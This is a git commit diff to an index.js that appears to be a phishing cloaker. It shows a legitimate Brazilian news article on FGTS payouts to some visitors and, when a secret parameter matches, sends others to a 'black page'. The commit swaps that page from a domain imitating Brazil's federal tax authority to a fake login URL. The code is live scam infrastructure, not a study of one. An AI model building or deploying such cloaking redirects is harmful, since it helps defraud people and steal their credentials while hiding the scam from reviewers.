c7b515e1fe8cd3e8a51c690f847974f56c17ee8a
LuxuryRedSky <fanggrehciate1981@gmail.com>
2025-03-12 22:18:03 -0500

    Update index.js

--- index.js
+++ index.js
@@ -8,7 +8,7 @@ const whitePage =
   process.env.WHITE_PAGE ||
   "https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2024-08/trabalhadores-vao-receber-parte-do-lucro-de-r-152-bilhoes-do-fgts";
 const blackPage =
-  process.env.BLACK_PAGE || "https://receita.federaldobrasil.site";
+  process.env.BLACK_PAGE || "https://www.acessochat.site/login/";
 
 // Parâmetros de segurança
 const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
